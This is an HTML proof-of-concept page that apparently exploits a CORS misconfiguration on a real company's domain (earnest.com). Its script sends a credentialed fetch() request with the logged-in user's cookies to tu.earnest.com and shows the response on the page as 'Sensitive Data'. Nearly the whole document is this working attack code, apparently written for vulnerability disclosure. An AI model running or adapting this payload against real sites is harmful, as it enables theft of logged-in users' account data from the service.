<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Exploit PoC - Earnest</title>
</head>
<body>
    <h2>CORS Exploit PoC</h2>
    <p>If you're logged into <strong>https://earnest.com</strong>, your data might get exposed.</p>

    <pre id="output">Fetching data...</pre>

    <script>
        fetch("https://tu.earnest.com", {
            method: "GET",
            credentials: "include" // Sends cookies of the logged-in user
        })
        .then(response => {
            if (!response.ok) throw new Error("Failed to fetch");
            return response.text();
        })
        .then(data => {
            document.getElementById("output").textContent = "Sensitive Data:\n\n" + data;
            console.log("Sensitive Data:", data);
        })
        .catch(err => {
            document.getElementById("output").textContent = "Error: " + err;
            console.error(err);
        });
    </script>
</body>
</html>
